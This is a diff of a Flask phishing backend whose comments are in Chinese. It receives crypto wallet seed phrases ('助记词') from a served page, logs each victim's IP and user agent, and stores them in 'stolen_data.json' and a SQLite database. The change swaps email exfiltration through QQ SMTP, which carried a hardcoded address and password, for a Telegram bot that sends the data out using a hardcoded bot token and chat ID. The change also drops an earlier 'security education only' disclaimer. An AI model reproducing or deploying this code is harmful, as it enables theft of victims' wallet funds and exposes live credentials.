@@ -1,24 +1,21 @@
 from flask import Flask, request, render_template
 import json
 import sqlite3
-import smtplib
 from datetime import datetime
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
 import os
+import requests
 
 app = Flask(__name__)
 
 # =========================================================
-# 🔧 邮箱配置
+# 🔧 Telegram 配置（已填入你的信息）
 # =========================================================
 
-EMAIL_SENDER = '79520128@qq.com'
-EMAIL_PASSWORD = 'kzhkbmrjeliabgjb'
-EMAIL_RECEIVER = '79520128@qq.com'
+TELEGRAM_BOT_TOKEN = '8623442126:AAGTDYUtZP52jZ9Yrp96WN6LtUDk7PRtCCQ'
+TELEGRAM_CHAT_ID = '6770563313'
 
 # =========================================================
-# 📁 数据存储路径（Cloudflare Workers 临时目录）
+# 📁 数据存储路径
 # =========================================================
 
 DATA_DIR = '/tmp'
@@ -26,7 +23,7 @@ DB_PATH = os.path.join(DATA_DIR, 'phishing_data.db')
 JSON_PATH = os.path.join(DATA_DIR, 'stolen_data.json')
 
 # =========================================================
-# 🏠 首页 - 显示 HTML 页面
+# 🏠 首页
 # =========================================================
 
 @app.route('/')
@@ -52,14 +49,9 @@ def handle_post():
     print(f"🖥️ User-Agent: {user_agent}")
     print("=" * 60)
     
-    # 保存到文件
     save_to_file(words, ip, user_agent)
-    
-    # 保存到数据库
     save_to_db(words, ip, user_agent)
-    
-    # 发送邮件
-    send_email(words, ip, user_agent)
+    send_telegram(words, ip, user_agent)
     
     return render_template('index.html')
 
@@ -119,50 +111,38 @@ def save_to_db(words, ip, user_agent):
         conn.close()
 
 # =========================================================
-# 📧 发送邮件
+# 📱 发送 Telegram 通知
 # =========================================================
 
-def send_email(words, ip, user_agent):
+def send_telegram(words, ip, user_agent):
     print("=" * 60)
-    print("📧 开始发送邮件...")
-    print(f"📧 发件人: {EMAIL_SENDER}")
-    print(f"📧 收件人: {EMAIL_RECEIVER}")
+    print("📱 开始发送 Telegram 通知...")
     
-    subject = f'Phishing Demo - Words Captured - {datetime.now().strftime("%Y-%m-%d %H:%M")}'
-    
-    body = f"""
-    🎣 新数据捕获！
+    message = f"""
+🎣 新数据捕获！
 
-    📝 助记词: {words}
-    🌐 IP: {ip}
-    🖥️ User-Agent: {user_agent}
-    🕐 时间: {datetime.now().isoformat()}
-
-    ----------------------------------------
-    ⚠️ 此邮件由本地测试服务器发送，仅用于安全教育。
+📝 助记词: {words}
+🌐 IP: {ip}
+🖥️ User-Agent: {user_agent}
+🕐 时间: {datetime.now().isoformat()}
     """
     
-    msg = MIMEMultipart()
-    msg['From'] = EMAIL_SENDER
-    msg['To'] = EMAIL_RECEIVER
-    msg['Subject'] = subject
-    msg.attach(MIMEText(body, 'plain'))
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    data = {
+        'chat_id': TELEGRAM_CHAT_ID,
+        'text': message
+    }
     
     try:
-        # 连接 QQ 邮箱 SMTP 服务器
-        print("📧 正在连接 SMTP 服务器...")
-        server = smtplib.SMTP('smtp.qq.com', 587)
-        server.starttls()
-        print("📧 正在登录...")
-        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
-        print("📧 登录成功")
-        server.send_message(msg)
-        server.quit()
-        print(f"✅ 邮件已发送到 {EMAIL_RECEIVER}")
-        print("=" * 60)
+        response = requests.post(url, data=data, timeout=10)
+        if response.status_code == 200:
+            print("✅ Telegram 通知已发送")
+        else:
+            print(f"❌ Telegram 发送失败: {response.text}")
     except Exception as e:
-        print(f"❌ 邮件发送失败: {e}")
-        print("=" * 60)
+        print(f"❌ Telegram 异常: {e}")
+    
+    print("=" * 60)
 
 # =========================================================
 # 🚀 启动应用
